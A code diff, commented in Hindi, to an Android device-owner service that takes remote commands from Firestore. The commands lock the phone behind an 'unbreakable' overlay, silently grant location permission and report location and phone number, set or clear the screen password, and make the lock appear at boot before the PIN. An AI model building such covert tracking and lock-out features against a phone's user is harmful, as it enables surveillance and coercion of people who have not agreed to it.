@@ -74,7 +74,15 @@ public class LockListenerService extends Service {
             startForeground(1001, notification);
         }
 
-        prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
+        // नया लॉजिक: Device Protected Storage का इस्तेमाल ताकि फोन रीबूट होने पर बिना पिन के फाइल पढ़ी जा सके
+        Context deviceContext = this;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            deviceContext = createDeviceProtectedStorageContext();
+            // अगर पुराना डेटा नॉर्मल फाइल में है, तो यह कमांड उसे ऑटोमैटिक सिक्योर फाइल में शिफ्ट कर देगा
+            deviceContext.moveSharedPreferencesFrom(this, "AppPrefs");
+        }
+
+        prefs = deviceContext.getSharedPreferences("AppPrefs", MODE_PRIVATE);
         mySessionId = prefs.getString("session_id", null);
         
         if (mySessionId == null) {
@@ -86,7 +94,7 @@ public class LockListenerService extends Service {
         adminComponent = new ComponentName(this, MyAdminReceiver.class);
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         
-        // 2. फोन चालू होते ही ऑफलाइन मेमोरी चेक करो
+        // 2. फोन चालू होते ही ऑफलाइन मेमोरी चेक करो (अब यह बिना देरी काम करेगा)
         boolean wasLocked = prefs.getBoolean("is_offline_locked", false);
         if (wasLocked) {
             showUnbreakableLock();
@@ -101,14 +109,12 @@ public class LockListenerService extends Service {
                 
                 if (snapshot != null) {
                     if (snapshot.exists()) {
-                        // ===== मौजूदा Release लॉजिक (बिना बदलाव) =====
                         Boolean isReleased = snapshot.getBoolean("is_released");
                         if (isReleased != null && isReleased) {
                             releaseOwnershipAndUninstall();
                             return;
                         }
 
-                        // ===== मौजूदा Lock/Unlock लॉजिक (बिना बदलाव) =====
                         Boolean isLocked = snapshot.getBoolean("is_locked");
                         if (isLocked != null && isLocked) {
                             prefs.edit().putBoolean("is_offline_locked", true).apply();
@@ -118,7 +124,6 @@ public class LockListenerService extends Service {
                             hideLock();
                         }
 
-                        // ===== नया: Advanced Commands =====
                         String pendingCommand = snapshot.getString("pending_command");
                         String commandId = snapshot.getString("command_id");
                         String lastProcessedId = prefs.getString("last_command_id", "");
@@ -129,7 +134,6 @@ public class LockListenerService extends Service {
                                 && commandId != null 
                                 && !commandId.equals(lastProcessedId)) {
                             
-                            // तुरंत मार्क कर दो ताकि दोबारा न चले
                             prefs.edit().putString("last_command_id", commandId).apply();
                             processCommand(pendingCommand, commandId, snapshot);
                         }
@@ -141,7 +145,6 @@ public class LockListenerService extends Service {
             });
     }
 
-    // ==================== नया कमांड प्रोसेसर ====================
     private void processCommand(String command, String commandId, com.google.firebase.firestore.DocumentSnapshot snapshot) {
         Map<String, Object> params = null;
         try {
@@ -218,10 +221,8 @@ public class LockListenerService extends Service {
                 .addOnFailureListener(e -> e.printStackTrace());
     }
 
-    // ---------- Get Location ----------
     private void handleGetLocation(String commandId) {
         try {
-            // Device Owner होने पर परमिशन खुद ग्रांट कर सकते हैं
             if (dpm != null && dpm.isDeviceOwnerApp(getPackageName()) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 dpm.setPermissionGrantState(adminComponent, getPackageName(),
                         android.Manifest.permission.ACCESS_FINE_LOCATION,
@@ -252,7 +253,6 @@ public class LockListenerService extends Service {
                 extra.put("accuracy", loc.getAccuracy());
                 writeCommandResult(commandId, "success", "Location fetched", extra);
             } else {
-                // Last known नहीं मिला तो एक बार रिक्वेस्ट करो
                 lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, new LocationListener() {
                     @Override
                     public void onLocationChanged(Location location) {
@@ -276,7 +276,6 @@ public class LockListenerService extends Service {
         }
     }
 
-    // ---------- Get Phone Number ----------
     private void handleGetPhoneNumber(String commandId) {
         try {
             if (dpm != null && dpm.isDeviceOwnerApp(getPackageName()) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -307,7 +306,6 @@ public class LockListenerService extends Service {
         }
     }
 
-    // ---------- Set Wallpaper ----------
     private void handleSetWallpaper(String commandId, Map<String, Object> params) {
         if (params == null || !params.containsKey("url")) {
             writeCommandResult(commandId, "error", "url missing in command_params");
@@ -339,7 +337,6 @@ public class LockListenerService extends Service {
         }).start();
     }
 
-    // ---------- Reset Wallpaper ----------
     private void handleResetWallpaper(String commandId) {
         try {
             WallpaperManager wm = WallpaperManager.getInstance(getApplicationContext());
@@ -354,7 +351,6 @@ public class LockListenerService extends Service {
         }
     }
 
-    // ---------- Set Password ----------
     private void handleSetPassword(String commandId, Map<String, Object> params) {
         if (params == null || !params.containsKey("password")) {
             writeCommandResult(commandId, "error", "password missing in command_params");
@@ -379,11 +375,9 @@ public class LockListenerService extends Service {
         }
     }
 
-    // ---------- Remove Password ----------
     private void handleRemovePassword(String commandId) {
         try {
             if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                // खाली पासवर्ड सेट करके हटाते हैं
                 boolean success = dpm.resetPassword("", 0);
                 dpm.setPasswordQuality(adminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
                 writeCommandResult(commandId, success ? "success" : "error", 
@@ -396,12 +390,10 @@ public class LockListenerService extends Service {
         }
     }
 
-    // ---------- Play Warning Audio ----------
     private void handlePlayWarning(String commandId) {
         try {
-            // साधारण लेकिन तेज वॉर्निंग टोन (बिना extra audio file के)
             ToneGenerator toneGen = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
-            toneGen.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 3000); // 3 सेकंड
+            toneGen.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 3000); 
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { toneGen.release(); } catch (Exception ignored) {}
             }, 3500);
@@ -410,8 +402,6 @@ public class LockListenerService extends Service {
             writeCommandResult(commandId, "error", e.getMessage());
         }
     }
-
-    // ==================== पुराने मेथड्स (बिना बदलाव) ====================
 
     private void showUnbreakableLock() {
         if (isOverlayShowing || windowManager == null) return;
@@ -449,7 +439,8 @@ public class LockListenerService extends Service {
                     WindowManager.LayoutParams.MATCH_PARENT,
                     layoutType,
                     WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+     
+WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                     PixelFormat.TRANSLUCENT);
 
